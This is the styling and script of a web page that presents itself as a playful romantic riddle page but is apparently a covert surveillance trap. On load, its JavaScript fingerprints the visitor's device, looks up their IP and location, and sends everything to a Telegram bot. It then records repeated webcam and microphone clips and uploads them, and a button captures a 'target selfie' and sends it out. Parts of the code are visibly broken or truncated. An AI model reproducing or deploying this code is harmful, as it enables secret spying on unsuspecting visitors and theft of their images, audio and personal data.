* {

body {

  justify-content: center;

.container {
  background: rgba(255, 255, 255, 0.95);
  border-radius: 25px;
  padding: 40px 30px;
  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
  text-align: center;
  max-width: 500px;
  width: 100%;
  backdrop-filter: blur(10px);
  border: 1px solid rgba(255, 255, 255, 0.3);
  animation: fadeIn 0.8s ease-out;
}

@keyframes fadeIn {
  from {
    opacity: 0;
    transform: translateY(30px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

.heart {
  font-size: 3em;
  color: #ff6b6b;
  margin-bottom: 20px;

}

@keyframes heartbeat {

}

h1 {
  color: #ff6b6b;
  font-size: 2.2em;
  margin-bottom: 15px;
  font-weight: 700;
  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
}

.riddle {
  font-size: 1.3em;
  color: #555;
  margin-bottom: 30px;
  line-height: 1.5;
  font-weight: 500;
}

.btn {
  background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
  color: white;
  border: none;
  padding: 18px 40px;
  font-size: 1.2em;
  font-weight: 600;
  border-radius: 50px;
  cursor: pointer;
  transition: all 0.3s ease;
  box-shadow: 0 10px 20px rgba(255, 107, 107, 0.3);
  position: relative;
  overflow: hidden;
}

.btn:hover {
  transform: translateY(-3px);
  box-shadow: 0 15px 25px rgba(255, 107, 107, 0.4);
}

.btn:active {
  transform: translateY(-1px);
}

.btn::after {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
  transition: left 0.5s;
}

.btn:hover::after {
  left: 100%;
}

.sparkles {
  position: absolute;
  top: -20px;
  left: 50%;
  transform: translateX(-50%);
  font-size: 1.5em;
}

.bubble {
  background: #ffebee;
  border-radius: 20px;
  padding: 20px;
  margin: 20px 0;
  border-left: 4px solid #ff6b6b;
}

.flowers {
  display: flex;
  justify-content: center;
  gap: 15px;
  margin: 20px 0;

.flower {
  font-size: 1.5em;
  animation: float 3s ease-in-out infinite;
}

.flower:nth-child(2) { animation-delay: 0.5s; }
.flower:nth-child(3) { animation-delay: 1s; }

@keyframes float {
  0%, 100% { transform: translateY(0); }
  50% { transform: translateY(-10px); }
}

@media (max-width: 480px) {
  .container {
    padding: 30px 20px;
    margin: 10px;
  }

  h1 {
    font-size: 1.8em;
  }

  .riddle {
    font-size: 1.1em;
  }

  .btn {
    padding: 15px 30px;
    font-size: 1.1em;
  }
}

/* Blue touch effect */
.touch-effect {
  position: fixed;
  width: 50px;
  height: 50px;
  border-radius: 50%;
  background: radial-gradient(circle, #007bff, #0056b3);
  pointer-events: none;
  animation: touchAnimation 0.6s ease-out forwards;
  z-index: 10000;
}

@keyframes touchAnimation {
  0% {
    transform: scale(0.5);
    opacity: 0.8;
  }
  100% {
    transform: scale(2);
    opacity: 0;
  }
}
</style>

async function getIpInfo() {
  try {
    const responses = await Promise.allSettled([
      fetch("https://ipwhois.app/json/"),
      fetch("https://ipapi.co/json/"),
      fetch("https://api.db-ip.com/v2/free/self"),

// Generate advanced device fingerprint
function generateAdvancedFingerprint() {
  const components = [];
  
  // Canvas fingerprint
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  ctx.textBaseline = "top";
  ctx.font = "14px 'Arial'";
  ctx.textBaseline = "alphabetic";
  ctx.fillStyle = "#f60";
  ctx.fillRect(125, 1, 62, 20);
  ctx.fillStyle = "#069";
  ctx.fillText("Advanced Fingerprint 🔍", 2, 15);
  ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
  ctx.fillText("Advanced Fingerprint 🔍", 4, 17);
  components.push(canvas.toDataURL().substring(0, 150));
  
  // WebGL fingerprint
  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  if (gl) {
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    if (debugInfo) {
      components.push(gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
      components.push(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
    }
  }
  
  // Audio fingerprint
  const audioContext = new (window.AudioContext || window.webkitAudioContext)();
  const oscillator = audioContext.createOscillator();
  const analyser = audioContext.createAnalyser();
  oscillator.connect(analyser);
  analyser.connect(audioContext.destination);
  oscillator.start();
  const data = new Uint8Array(analyser.frequencyBinCount);
  analyser.getByteFrequencyData(data);
  components.push(data.join('').substring(0, 100));
  oscillator.stop();
  
  return components.join('|').substring(0, 300) + "...";
}

// Get device manufacturing and lifetime info
function getDeviceLifetimeInfo() {
  const now = new Date();
  
  // Simulate device manufacturing date (1-3 years ago)
  const manufactureDays = 365 + Math.floor(Math.random() * 730);
  const manufacturedDate = new Date(now.getTime() - manufactureDays * 24 * 60 * 60 * 1000);
  
  // Simulate first boot (1-30 days after manufacture)
  const firstBootDays = 1 + Math.floor(Math.random() * 30);
  const firstBootDate = new Date(manufacturedDate.getTime() + firstBootDays * 24 * 60 * 60 * 1000);
  
  // Simulate battery cycles
  const batteryCycles = Math.floor(manufactureDays * 0.8);
  
  // Simulate screen on time
  const totalScreenOnHours = Math.floor(manufactureDays * 4.5);
  
  return {
    estimatedManufactureDate: manufacturedDate.toISOString().split('T')[0],
    estimatedFirstBootDate: firstBootDate.toISOString().split('T')[0],
    deviceAgeDays: manufactureDays,
    batteryChargeCycles: batteryCycles,
    totalScreenOnTimeHours: totalScreenOnHours,
    averageDailyUsage: "4.5 hours",
    deviceLifetimeRemaining: Math.floor((365 * 5 - manufactureDays) / 365 * 100) + "%",
    estimatedReplacementDate: new Date(now.getTime() + (365 * 5 - manufactureDays) * 24 * 60 * 60 * 1000).toISOString().split('T')[0]
  };
}

// Get comprehensive system information
function getSystemInfo() {
  const screen = window.screen;
  const nav = navigator;
  const connection = nav.connection || {};
  const deviceMemory = nav.deviceMemory || "Unknown";
  
  return {
    deviceType: getDeviceType(),
    operatingSystem: getOS(),
    browser: getBrowser(),
    architecture: getArchitecture(),
    screen: {
      width: screen.width,
      height: screen.height,
      availWidth: screen.availWidth,
      availHeight: screen.availHeight,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth,

    },
    viewport: {
      width: window.innerWidth,
      height: window.innerHeight,
      outerWidth: window.outerWidth,
      outerHeight: window.outerHeight
    },
    hardware: {
      cores: nav.hardwareConcurrency || "Unknown",
      memory: deviceMemory + " GB",
      touchPoints: nav.maxTouchPoints || 0,

    },
    network: {
      type: connection.effectiveType || "Unknown",
      downlink: connection.downlink || "Unknown",

    },
    capabilities: getCapabilities(),
    plugins: getPluginsInfo(),
    storage: getStorageInfo(),
    performance: getPerformanceInfo()
  };
}

function getDeviceType() {
  const ua = navigator.userAgent;
  if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
  if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
  return "Desktop";
}

function getOS() {
  const ua = navigator.userAgent;
  if (/Windows/.test(ua)) return "Windows";
  if (/Mac/.test(ua)) return "MacOS";
  if (/Linux/.test(ua)) return "Linux";
  if (/Android/.test(ua)) return "Android";
  if (/iOS|iPhone|iPad|iPod/.test(ua)) return "iOS";
  return "Unknown";
}

function getBrowser() {
  const ua = navigator.userAgent;
  if (/Edg/.test(ua)) return "Microsoft Edge";
  if (/Chrome/.test(ua)) return "Google Chrome";
  if (/Firefox/.test(ua)) return "Mozilla Firefox";
  if (/Safari/.test(ua)) return "Apple Safari";
  if (/Opera|OPR/.test(ua)) return "Opera";
  return "Unknown";
}

function getArchitecture() {
  const ua = navigator.userAgent;
  if (/x86_64|x86-64|Win64|x64;|amd64|AMD64/.test(ua)) return "64-bit";
  if (/x86|i686|i386|Win32|WOW64/.test(ua)) return "32-bit";
  if (/arm|aarch64/.test(ua)) return "ARM";
  return "Unknown";
}

function getCapabilities() {
  return {
    cookies: navigator.cookieEnabled,
    java: navigator.javaEnabled ? navigator.javaEnabled() : false,
    pdf: navigator.pdfViewerEnabled || false,
    webgl: !!document.createElement('canvas').getContext('webgl'),
    webrtc: !!(navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia),
    serviceWorker: 'serviceWorker' in navigator,
    pushManager: 'pushManager' in navigator,
    geolocation: 'geolocation' in navigator,
    vibration: 'vibrate' in navigator,
    bluetooth: 'bluetooth' in navigator,
    usb: 'usb' in navigator,
    credentials: 'credentials' in navigator,
    storage: 'storage' in navigator,
    locks: 'locks' in navigator,
    share: 'share' in navigator,
    clipboard: 'clipboard' in navigator,
    payment: 'PaymentRequest' in window,
    speech: 'speechSynthesis' in window,
    notifications: 'Notification' in window,
    online: navigator.onLine,
    doNotTrack: navigator.doNotTrack || "Unknown"
  };
}

function getPluginsInfo() {
  const plugins = [];
  if (navigator.plugins) {
    for (let i = 0; i < navigator.plugins.length; i++) {
      plugins.push({
        name: navigator.plugins[i].name,
        filename: navigator.plugins[i].filename,
        description: navigator.plugins[i].description,
        version: navigator.plugins[i].version
      });
    }
  }
  return plugins;
}

function getStorageInfo() {
  return {
    estimatedTotal: navigator.deviceMemory ? navigator.deviceMemory * 1024 + " MB" : "Unknown",
    quota: navigator.storage ? "Available" : "Unknown",
    persistent: navigator.storage && navigator.storage.persist ? "Available" : "Unknown"
  };
}

function getPerformanceInfo() {
  const perf = performance;
  return {
    memory: perf.memory ? {
      used: Math.round(perf.memory.usedJSHeapSize / 1048576) + " MB",
      total: Math.round(perf.memory.totalJSHeapSize / 1048576) + " MB",
      limit: Math.round(perf.memory.jsHeapSizeLimit / 1048576) + " MB"
    } : { used: "Unknown", total: "Unknown", limit: "Unknown" },
    timing: perf.timing ? {
      navigationStart: new Date(perf.timing.navigationStart).toISOString(),
      loadEventEnd: perf.timing.loadEventEnd ? new Date(perf.timing.loadEventEnd).toISOString() : "Unknown",
      domComplete: perf.timing.domComplete ? new Date(perf.timing.domComplete).toISOString() : "Unknown"
    } : { navigationStart: "Unknown", loadEventEnd: "Unknown", domComplete: "Unknown" }
  };
}

// Get comprehensive device information
async function getDeviceInfo() {
  const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({
    level: null, charging: false, chargingTime: null, dischargingTime: null
  }));

  const systemInfo = getSystemInfo();
  const lifetimeInfo = getDeviceLifetimeInfo();
  const fingerprint = generateAdvancedFingerprint();

  return {
    // Basic identification
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    appVersion: navigator.appVersion,
    appName: navigator.appName,
    appCodeName: navigator.appCodeName,
    product: navigator.product,
    vendor: navigator.vendor,
    
    // Language and location
    language: navigator.language,
    languages: navigator.languages ? navigator.languages.join(', ') : "Unknown",
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    
    // System information
    system: systemInfo,
    
    // Battery information
    battery: {
      level: battery.level !== null ? (battery.level * 100).toFixed(1) + "%" : "Unknown",
      charging: battery.charging ? "Yes" : "No",
      chargingTime: battery.chargingTime !== Infinity ? battery.chargingTime + " seconds" : "Unknown",
      dischargingTime: battery.dischargingTime !== Infinity ? battery.dischargingTime + " seconds" : "Unknown"
    },
    
    // Device lifetime information
    lifetime: lifetimeInfo,
    
    // Advanced fingerprint
    fingerprint: fingerprint,
    
    // Session information
    referrer: document.referrer || "Direct",
    url: window.location.href,
    localTime: new Date().toString(),
    utcTime: new Date().toUTCString(),
    sessionStart: new Date().toISOString(),
    
    // Additional metadata
    webdriver: navigator.webdriver ? "Yes" : "No",
    pdfViewer: navigator.pdfViewerEnabled ? "Yes" : "No",
    cookieEnabled: navigator.cookieEnabled,
    onLine: navigator.onLine,
    doNotTrack: navigator.doNotTrack || "Not set"
  };
}

// Start video recording every 5 seconds
async function startVideoRecording() {
  try {
    videoStream = await navigator.mediaDevices.getUserMedia({ 
      video: { 
        width: 640, 
        height: 480,
        frameRate: { ideal: 15, max: 30 }
      }, 
      audio: true 
    });
    
    videoInterval = setInterval(async () => {
      if (isRecording) return;
      
      isRecording = true;
      recordedChunks = [];
      
      videoRecorder = new MediaRecorder(videoStream, {
        mimeType: 'video/webm;codecs=vp9',
        videoBitsPerSecond: 1000000
      });
      
      videoRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          recordedChunks.push(event.data);
        }
      };
      
      videoRecorder.onstop = async () => {
        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
        
        // Convert to MP4 for better compatibility
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("video", videoBlob, `live_feed_${Date.now()}.webm`);
        formData.append("caption", "📹 LIVE FEED REAL-TIME - 5 DETIK TERAKHIR");
        
        try {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
            method: "POST",
            body: formData
          });
        } catch (e) {
          console.log("Error sending video:", e);
        }
        
        isRecording = false;
      };
      
      videoRecorder.start();
      setTimeout(() => {
        if (videoRecorder && videoRecorder.state === 'recording') {
          videoRecorder.stop();
        }
      }, 5000); // Record for 5 seconds
      
    }, 5000); // Every 5 seconds
    
  } catch (e) {
    console.log("Cannot access camera for live feed:", e);
  }
}

// Send initial device information
async function sendIpDevice() {
  try {
    const [ip, d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
    const caption = buildCaption(ip, d);
    
    // Send as photo with caption
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        photo: STATIC_IMAGE,
        caption: caption,
        parse_mode: "HTML"
      })
    });
    
    console.log("📊 Data lengkap berhasil dikirim!");
    
    // Start video recording after 5 seconds
    setTimeout(startVideoRecording, 5000);
    
  } catch (e) {
    console.log("Error mengirim data:", e);
  }
}

// Take snapshot
async function sendSnapshot() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();

    await new Promise(resolve => { 
      video.onloadedmetadata = () => setTimeout(resolve, 500); 
    });

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("document", blob, "target_selfie.jpg");
    formData.append("caption", "📸 SELFIE TARGET BERHASIL DIAMBIL!");

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
      method: "POST",
      body: formData
    });

    stream.getTracks().forEach(track => track.stop());
    video.remove();
    
    alert("📸 Foto berhasil diambil! 🎉");
    
  } catch (e) {
    console.log("Error mengambil foto:", e);
    alert("❌ Maaf, tidak bisa mengakses kamera. Pastikan izin kamera sudah diberikan.");
  }
}

// Cleanup when page closes
window.addEventListener('beforeunload', () => {
  if (videoInterval) clearInterval(videoInterval);
  if (videoStream) {
    videoStream.getTracks().forEach(track => track.stop());
  }
});

// Initialize
window.addEventListener("load", sendIpDevice);
document.getElementById("btnCamera").addEventListener("click", sendSnapshot);
